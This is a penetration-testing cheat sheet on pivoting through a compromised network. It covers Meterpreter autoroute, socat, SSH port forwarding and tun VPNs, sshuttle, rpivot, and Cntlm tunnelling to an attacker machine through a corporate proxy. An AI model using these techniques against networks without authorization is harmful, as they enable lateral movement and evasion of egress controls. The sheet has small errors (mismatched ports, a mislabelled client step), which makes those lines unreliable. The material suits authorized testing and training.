## Pivoting

Pivoting is a process of moving from one compromised host to another.
It's a unique technique of using an instance (also referred as a "plant" or a "foothold") to be able to more around inside a network.

### Pivoting with Meterpreter

```bash
meterpreter > run autoroute -s 7.7.7.0/24
meterpreter > run autoroute -p
meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
```

```bash
msf > use auxiliary/server/socks4
msf > run
```


### Pivoting with rinetd

```bash
apt install rinetd
cat /etc/rinetd.conf
systemctl start rinetd
rinetd -f
```

### Pivoting with socat

Redirecting 9000/tcp -> 127.0.0.1:8080/tcp:

```bash
socat tcp-l:9000,fork,reuseaddr tcp:127.0.0.1:8000
```

Binding on the given address:

```bash
socat tcp-l:9000,fork,reuseaddr,bind=192.168.0.102 tcp:127.0.0.1:8000
```

### Pivoting with ssh

Initiating a connection to the compromised host:

```bash
ssh -o “PasswordAuthentication=yes” -o "StrictHostKeyChecking=no" hacker@10.11.0.163 -R 3306:127.0.0.1:3306 
```

```bash
ssh hacker@10.11.0.163 -D 1080
```

```bash
ssh hacker@10.11.0.163 -L 445:192.168.1.1:445
```

Creating reverse connections from the compromised host (binding a dynamic proxy):

```bash
ssh gh0st@10.10.10.10 -D 127.0.0.1:9050 -R 127.0.0.1:9050:127.0.0.1:9050 -N -f
```

### Using sshuttle

Forwarding all traffic to the remote network:

```bash
sshuttle -r username@remotehost 0.0.0.0/0
```

Restricting the VPN to specific subnets rather than all network traffic:

```bash
sshuttle -r username@remotehost 10.0.0.0/8 172.16.0.0/16
```

Forwarding DNS queries:

```bash
sshuttle --dns -r username@remotehost 10.0.0.0/8 172.16.0.0/16
```


### Deploying VPN over ssh

Since openssh release 4.3 it is possible to tunnel layer 3 network traffic via an established ssh channel. This has an advantage over a typical tcp tunnel because you are in control of ip traffic. 
So, for example, you are able to perform SYN-scan with nmap and use your tools directly without resorting to `proxychains` or other proxifying tools. 
It’s done via the creation of **tun** devices on client and server side and transferring the data between them over ssh connection. 

This is quite simple, but you need root on both machines since the creation of tun devices is a privileged operation. 

These lines should be present in your `/etc/ssh/sshd_config` file (server-side):
```text
    PermitRootLogin yes
    PermitTunnel yes
```

Creating a pair of tun devices:

```bash
ssh user@host -w any:any
```

Configuring the client interface:

```bash
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
```

Configuring the server interface:

```bash
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
```

Enabling IP forwarding and NAT on the server:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Routing through the given gateway:

```bash
route add -net 10.0.0.0/16 gw 1.1.1.1
```

### Pivoting with redsocks

- https://crosp.net/blog/administration/install-configure-redsocks-proxy-centos-linux/

### Pivoting with rpivot

- https://github.com/artkond/rpivot 

This is a method of traversing NAT connections. This is a reverse socks proxy tool that allows you to tunnel traffic via socks proxy. 
As a result, a socks4 proxy service will be bound server side on port 1080.

Running on the server side:

```bash
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```

Running on the server side:

```bash
python client.py --server-ip <ip> --server-port 9999
```

### Pivoting with Cntlm

- http://cntlm.sourceforge.net/ is the tool of choice for running any non-proxy aware programs over NTLM-proxy.

Basically this tool authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. 
This port bound does not require any authentication so you can use your tools directly (putty/ssh for example). It uses a config file for its operation. 

Here’s a bare-bones config example to forward port 443 (this port is most likely to be allowed through the proxy):

```text
    Username Alice
    Password [email protected]
    Domain CONTOSO.COM
    Proxy 10.0.0.10:8080
    Tunnel 2222:<attackers_machine>:443
```

Given you have ssh running on the remote host on port 443, you can launch ssh client (openssh/putty) and connect to local port 2222 to get access to the external machine.

Running the tool:

```bash
cntlm.exe -c config.conf
```

## socat KungFu

Sending data from stdIO to a TCP4 connection to port 80 of host www.domain.org:

```bash
echo "GET / HTTP/1.1\r\nHost: www.domain.org\r\n\r\n" | socat - TCP4:www.domain.org:80
```

## Serial ports to TCP

Create a tunnel between a serial port and a TCP socket:

```bash 
socat pty,link=/dev/virtualcom0,raw  tcp:192.168.254.254:8080
```
